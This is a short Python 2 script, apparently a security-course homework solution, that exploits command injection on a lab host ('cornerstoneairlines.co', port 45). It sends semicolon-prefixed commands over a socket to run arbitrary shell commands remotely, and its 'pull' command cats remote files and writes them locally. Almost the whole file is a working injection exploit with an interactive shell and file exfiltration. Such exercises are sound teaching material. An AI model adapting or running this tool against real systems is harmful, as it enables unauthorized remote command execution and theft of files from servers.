"""
    Use the same techniques such as (but not limited to):
        1) Sockets
        2) File I/O
        3) raw_input()
    from the OSINT HW to complete this assignment. Good luck!
"""

import socket, time

host = "cornerstoneairlines.co" # IP address here
port = 45 # Port here

def execute_cmd(cmd):
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((host, port))
	s.recv(1024)
	s.send(cmd + "\n")
	time.sleep(4)
	return s.recv(1024)

if __name__ == '__main__':
	contin = True
	dir = ''
	shell = False
	while contin:
		cmd = raw_input(dir + "/>")
		args = cmd.split()
		if cmd == 'quit':
			contin = False
		elif len(args) == 0:
			args = []
		elif len(args) == 1 and cmd == 'help':
			print("1) shell	Drop into a shell\n2)pull <remote-path> <local-path>	Download files\n3) help	shows this help\n4)quit	Quit this shell")
		elif len(args) == 3 and args[0] == 'pull':
			response = execute_cmd("; cd " + dir + "; cat " + args[1])
			if response == "\n":
				print("File requested does not exist."),
			else:
				f = open(args[2], "w")
				f.write(response)
				f.close()
				print("File has been pulled to " + args[2]);
		elif len(args) == 1 and args[0] == 'shell':
			shell = True
		elif shell == True and len(args) == 2 and args[0] == "cd":
			dir += args[1]
		elif shell == True:
				if dir == "":
					response = execute_cmd("; " +  " ".join(args))
				else:
					response = execute_cmd("; cd " + dir + "; " + " ".join(args))
				print(response);
		else:
			print("Invalid Command.  For Valid Commands, Type help")
